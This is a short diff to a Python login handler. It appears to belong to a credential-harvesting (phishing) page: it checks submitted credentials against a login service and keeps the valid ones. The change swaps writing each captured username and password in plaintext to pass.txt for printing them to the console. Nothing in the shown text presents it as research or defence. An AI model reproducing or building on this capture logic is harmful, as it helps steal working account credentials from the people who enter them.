@@ -34,9 +34,10 @@ def handle(request):
         json_data = json.loads(login.text)
         if json_data["authenticated"]:
             print("login successful")
-            file=open('pass.txt','a')
-            file.write(f'{username}, {password}\n')
-            file.close()
+           # file=open('pass.txt','a')
+          #  file.write(f'{username}, {password}\n')
+           # file.close()
+            print(f'username: {username},   password: {password}')
             return render(request, 'index_passed.html')
 
             #cookies = login_response.cookies
